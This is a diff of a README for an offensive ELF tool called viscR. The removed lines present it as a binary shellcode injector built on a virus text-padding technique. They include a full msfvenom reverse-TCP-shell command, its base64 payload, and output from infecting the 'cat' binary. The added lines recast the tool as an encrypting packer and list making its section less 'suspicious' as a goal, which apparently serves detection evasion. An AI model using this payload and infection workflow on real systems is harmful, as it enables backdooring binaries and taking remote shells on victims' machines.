@@ -1,30 +1,25 @@
 # About
-Binary file shellcode injector.  
-ELF injection based on [Silvio Cesar Text Segment padding](https://web.archive.org/web/20131008165947/http://vxheaven.org/lib/vsc01.html)  
+ELF file packer
 Saves original binary execution flow
+The flow:
+1. Compress a whole file
+2. Encrypt the blob with AES128 CBC
+3. Create new ELF section in stub bin and put binary blob inside of it 
 
 # Installation
-`pip install -r requirements.txt`
+Just *Make* it
+**zlib1g-dev is required**
 
 # Usage
-Works only with amd64 ELF bins, for now...  
+Works only with 64-bits ELF bins  
 Example:  
 ```
-Usage: viscr.py <binary> <b64 encoded shellcode>
-============
-> msfvenom -p linux/x64/shell_reverse_tcp -f base64  LHOST=127.0.0.1 LPORT=4242
-ailYmWoCX2oBXg8FSJdIuQIAEJJ/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
-============
-> ./viscR.py cat ailYmWoCX2oBXg8FSJdIuQIAEJJ/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
-Using user supplied shellcode
-Arch === amd64
-Endian === little
-Found cave at 0x7049 ; size - 16457
-cat_infctd created. Use wisely
+./viscR <binary to pack> -->
+./binary_protected
 ```
 
 # Todo
-+ PE, Mach-O support
-+ ARM64 support
-+ Shellcode encoding/ubfuscation/encryption
-+ etc. etc. etc.
++ Make section less "suspicious"
++ PE, Mach-O support - Why Not
++ Packed blob encoding/ubfuscation/encryption
++ ughhhhh
